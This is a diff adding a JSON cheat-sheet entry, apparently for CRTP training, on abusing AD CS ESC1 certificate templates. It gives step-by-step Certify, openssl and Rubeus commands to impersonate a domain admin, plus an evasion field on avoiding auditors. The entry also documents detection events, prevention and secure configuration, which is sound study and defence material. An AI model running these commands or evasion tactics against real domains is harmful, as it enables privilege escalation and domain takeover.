@@ -1,0 +1,111 @@
+{
+  "id": "crtp-adcs-esc1",
+  "name": "AD CS ESC1 \u2014 Subject Alt Name (SAN) Abuse",
+  "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<template_name> /altname:<user>",
+  "description": "Abuse a certificate template with enrollee-supplied subject enabled (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) to request a certificate as any domain user including DA.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Cross-Trust",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "quiet",
+  "mitre": [
+    "T1649",
+    "T1558"
+  ],
+  "tools": [
+    "Certify",
+    "Rubeus"
+  ],
+  "tags": [
+    "adcs",
+    "esc1",
+    "certificate",
+    "san",
+    "da-escalation",
+    "certify"
+  ],
+  "steps": [
+    {
+      "label": "Find ESC1 vulnerable templates",
+      "command": "Certify.exe find /vulnerable"
+    },
+    {
+      "label": "Request cert as Administrator",
+      "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<template_name> /altname:Administrator"
+    },
+    {
+      "label": "Convert PEM to PFX (Linux)",
+      "command": "openssl pkcs12 -in cert.pem -keyfile key.pem -out cert.pfx -export -passout pass:<password>"
+    },
+    {
+      "label": "Request TGT with cert",
+      "command": "Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:<password> /domain:<domain> /dc:<dc_ip> /ptt"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Find ESC1 vulnerable templates",
+      "command": "Certify.exe find /vulnerable"
+    },
+    {
+      "label": "Request cert as DA",
+      "command": "Certify.exe request /ca:CA01.corp.local\\corp-CA01 /template:VulnTemplate /altname:Administrator"
+    },
+    {
+      "label": "Convert cert to PFX",
+      "command": "openssl pkcs12 -in cert.pem -keyfile key.pem -out cert.pfx -export -passout pass:Password123"
+    },
+    {
+      "label": "Authenticate as Administrator",
+      "command": "Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:Password123 /domain:corp.local /dc:<dc_ip> /ptt"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-dcsync",
+      "note": "DCSync with DA TGT obtained via cert",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-adcs-esc3",
+      "note": "ESC3 as alternative enrollment agent path",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-golden-ticket",
+      "note": "Create golden ticket after krbtgt dump",
+      "rel": "next"
+    }
+  ],
+  "notes": "ESC1 conditions: Manager Approval=disabled, Auth. Signatures=0, EnhancedKeyUsage includes Client Authentication, enrollee supplies subject.",
+  "references": [
+    {
+      "title": "CRTP - AD CS ESC1",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "SpecterOps - Certified Pre-Owned",
+      "url": "https://specterops.io/assets/resources/Certified_Pre-Owned.pdf"
+    }
+  ],
+  "defense": {
+    "why_it_works": "AD CS (Active Directory Certificate Services) issues X.509 certificates used for Kerberos authentication (PKINIT). ESC1 occurs when a certificate template has: (1) Enrollee Supplies Subject = True (attacker specifies any Subject Alternative Name including another user's UPN), (2) Extended Key Usage includes Client Authentication, and (3) the template is accessible to low-priv users. The attacker enrolls for a certificate specifying a DA UPN as the SAN \u2014 the CA issues it. That certificate authenticates as the DA via PKINIT.",
+    "prerequisites": "Any domain user. Access to an AD CS CA. A vulnerable certificate template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT and Client Authentication EKU. Certify.exe or Certipy to find and exploit. Rubeus for PKINIT auth.",
+    "impact": "T1649 Steal or Forge Authentication Certificates + T1558 Kerberos Ticket Abuse. Obtains a certificate authenticating as any domain user (including DA/krbtgt). PKINIT produces a valid TGT for the impersonated account. Persistent \u2014 certificate valid for the template's lifetime (often 1 year). Survives DA password changes.",
+    "detection": "Event 4887 (CA issued certificate): abnormal certificate requests where the SubjectAltName field contains a UPN different from the requesting user. MDI: 'Suspected AD CS ESC1 certificate request'. SIEM: CA audit log \u2014 certificate issued for user other than the requesting principal. Sysmon Event 25 (process tampering) if Certify.exe detected. CRL/OCSP analysis: certificate issued to non-matching principal.\nAbnormal AD CS certificate enrollment and usage; registry access to certificate storage; unusual processes exporting or accessing private keys (DET0240/AN0671).\nFile access to certificate directories; OpenSSL or PKCS#12 utilities exporting/modifying certificates; processes accessing sensitive key storage paths (AN0672).\nKeychain API calls and file access to ~/Library/Keychains or /Library/Keychains for stored certificates and private keys (AN0673).\nAbnormal certificate enrollment in identity platforms; unexpected use of token-signing certificates; unusual CA configuration modifications (AN0674).",
+    "artifacts": "CA Event 4887: certificate issued with SAN different from requesting user | MDI: AD CS ESC1 alert | CA audit log: template with ENROLLEE_SUPPLIES_SUBJECT used | Event 4768/4769: PKINIT logon using the fraudulent certificate",
+    "prevention": "Disable 'Enrollee Supplies Subject' (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) on all templates that have Client Authentication EKU: Certificate Templates Console \u2192 Properties \u2192 Subject Name \u2192 uncheck 'Supply in the request'. Enable CA Manager Approval for any template that must keep this flag. Run Certify.exe /vulnerable regularly to audit templates. Deploy MDI. Restrict certificate template enrollment to specific groups.\nActive Directory Configuration: Treat CA servers as tier-0 assets; harden abusable CA settings; disable SAN usage in authentication protocols to enforce strict user mappings; enforce CA Certificate Manager approval for templates with SAN issuance requirements.\nAudit: Check and remediate unneeded certificates and common misconfigurations (enrollment permissions, overly permissive templates) via certsrv.msc, certutil.exe, PSPKIAudit, and Certify.\nDisable or Remove Feature or Program: Disable old/dangerous auth protocols (NTLM) and unnecessary AD CS web/enrollment server roles.\nEncrypt Sensitive Information: Secure certificates and private keys; use TPM or HSM; enforce HTTPS and Extended Protection for Authentication.",
+    "evasion": "Request a certificate that matches a legitimate-looking user to avoid CA auditors noticing. Use the certificate over PKINIT for Kerberos (doesn't generate LDAP or SMB auth events). Combine with ESC3 for multi-step abuse that's harder to correlate.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1649/",
+      "https://attack.mitre.org/techniques/T1558/"
+    ],
+    "misconfiguration": "Certificate template has CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled AND Client Authentication EKU AND is enrollable by Domain Users. No CA Manager Approval. CA auditing not enabled.",
+    "vulnerable_config": "# Find vulnerable templates (Certify / Certipy):\nCertify.exe find /vulnerable\n# [!] Vulnerable Certificate Templates:\n# Template: UserTemplate\n# Enrollee Supplies Subject: True\n# Extended Key Usages: Client Authentication\n# Enrollment Permissions: Domain Users\n# \u2192 ANY domain user can request cert as DA!\n\n# CA has no Manager Approval:\n# Certificate Templates \u2192 UserTemplate \u2192 Properties \u2192 Issuance Requirements\n# \u2192 CA certificate manager approval: unchecked = auto-issue = VULNERABLE",
+    "secure_config": "# Fix ESC1: disable 'Supply in the request':\n# Certificate Templates MMC \u2192 right-click template \u2192 Properties\n# \u2192 Subject Name tab \u2192 'Supply in the request': UNCHECK\n# \u2192 'Build from Active Directory information': CHECK\n\n# Or require CA Manager Approval:\n# \u2192 Issuance Requirements \u2192 CA certificate manager approval: CHECK\n\n# Audit vulnerable templates:\nCertify.exe find /vulnerable\nCertipy find -u user@corp.local -p pass -dc-ip 10.0.0.1 -vulnerable\n\n# Enable CA audit logging:\n# CA Properties \u2192 Auditing \u2192 Issue and manage certificate requests: CHECK\n# Event 4887 will log all certificate issuances"
+  }
+}
